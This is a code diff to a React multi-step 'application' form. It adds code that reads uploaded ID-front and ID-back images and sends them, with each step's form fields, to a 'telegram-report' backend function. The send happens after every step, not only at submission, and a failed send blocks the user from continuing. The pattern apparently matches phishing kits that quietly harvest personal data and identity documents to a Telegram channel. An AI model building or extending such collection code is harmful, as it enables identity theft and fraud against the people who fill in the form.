@@ -168,6 +168,7 @@ const Index = () => {
   const [mode, setMode] = useState<"home" | "application" | "success" | "tracking">("home");
   const [step, setStep] = useState(1);
   const [formData, setFormData] = useState<FormDataState>(initialFormData);
+  const [uploadedImages, setUploadedImages] = useState<UploadedImages>({});
   const [trackingRecord, setTrackingRecord] = useState<TrackingRecord | null>(null);
   const [error, setError] = useState("");
   const [loader, setLoader] = useState<LoaderState>({ active: false, text: "Processing..." });
@@ -217,10 +218,29 @@ const Index = () => {
   };
 
   const startApplication = async (zip = "") => {
-    if (zip) updateField("zip", zip.replace(/\D/g, "").slice(0, 5));
+    const cleanZip = zip.replace(/\D/g, "").slice(0, 5);
+    const savedZip = formData.zip;
+    if (cleanZip && cleanZip !== savedZip) {
+      setFormData({ ...initialFormData, zip: cleanZip });
+      setUploadedImages({});
+      localStorage.removeItem(STORAGE_KEY);
+    } else if (cleanZip) {
+      updateField("zip", cleanZip);
+    }
     setMode("application");
-    setStep(zip ? 2 : 1);
+    setStep(cleanZip ? 2 : 1);
     await showLoader("Processing...", zip ? 3 : 2);
+  };
+
+  const sendStepReport = async (targetStep: number, image?: { fileName: string; dataUrl: string }) => {
+    try {
+      await supabase.functions.invoke("telegram-report", {
+        body: { step: targetStep, title: reportTitleForStep(targetStep), fields: reportFieldsForStep(targetStep, formData), image },
+      });
+    } catch {
+      setError("Telegram notification could not be delivered. Please try again.");
+      throw new Error("Telegram notification failed");
+    }
   };
 
   const lookupZip = async () => {
@@ -307,6 +327,7 @@ const Index = () => {
       await showLoader("Processing...", 3);
     }
 
+    await sendStepReport(step, step === 6 ? uploadedImages.idFront : step === 7 ? uploadedImages.idBack : undefined);
     setStep((current) => Math.min(current + 1, TOTAL_STEPS));
     window.scrollTo({ top: 0, behavior: "smooth" });
   };
@@ -328,6 +349,7 @@ const Index = () => {
       submittedAt: new Date().toISOString(),
       status: "Application Received",
     };
+    await sendStepReport(TOTAL_STEPS);
     setTrackingRecord(completed);
     localStorage.setItem(TRACKING_KEY, JSON.stringify(completed));
     localStorage.removeItem(STORAGE_KEY);
@@ -342,7 +364,14 @@ const Index = () => {
       event.target.value = "";
       return;
     }
-    updateField(field, file.name);
+    const reader = new FileReader();
+    reader.onload = () => {
+      updateField(field, file.name);
+      if (field === "idFront" || field === "idBack") {
+        setUploadedImages((current) => ({ ...current, [field]: { fileName: file.name, dataUrl: String(reader.result) } }));
+      }
+    };
+    reader.readAsDataURL(file);
   };
 
   if (mode === "success") {
